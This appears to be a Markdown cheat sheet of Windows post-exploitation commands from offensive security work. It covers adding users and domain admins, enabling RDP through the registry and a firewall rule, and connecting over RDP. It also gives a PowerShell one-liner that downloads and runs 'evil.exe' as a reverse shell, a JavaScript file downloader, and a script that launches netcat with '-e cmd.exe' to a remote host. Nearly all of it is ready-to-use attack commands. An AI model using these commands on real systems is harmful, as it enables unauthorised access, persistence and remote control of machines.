# Windows

## users

Add user 
```
net user [username] [password] /ADD
```

Add user to domain 
```
net user [username] [password] /ADD /DOMAIN
```

Add user as admin
```
net localgroup administrators [username] /add
```

## RDP
- Enable RDP
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

- Add firewall authorisation
```
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
profile=private,domain localport=3389 protocol=tcp
```

- Connect to windows RDP
```
rdesktop -g 95% -u user -p password 10.0.0.1 -r disk:share=/ftphome
```

## File Upload

- PowerShell download and execute
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile 
New-Object System.Net.WebClient.DownloadFile('http://x.x.x.x/evil.exe','evil.exe'); 
evil.exe x.x.x.x 443 -e cmd.exe
```

- VBS file upload
  - fu.js
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); 
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); 
WinHttpReq.Send(); 
WScript.Echo(WinHttpReq.ResponseText); 
```
  - execute
```
cscript /nologo fu.js http://ip/bullshit > uploaded_file
```

## Change user
- userchange.ps1
```powershell
$secpasswd = ConvertTo-SecureString "passwordhere" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("usernamehere", $secpasswd)
$computer = "Hostnamehere"
[System.Diagnostics.Process]::Start("c:\temp\nc.exe","10.0.0.1 4444 -e cmd.exe",$mycreds.Username, $mycreds.Password, $computer)
```
- execute as
```
powershell -ExecutionPolicy Bypass -File c:\temp\change_user.ps1
```


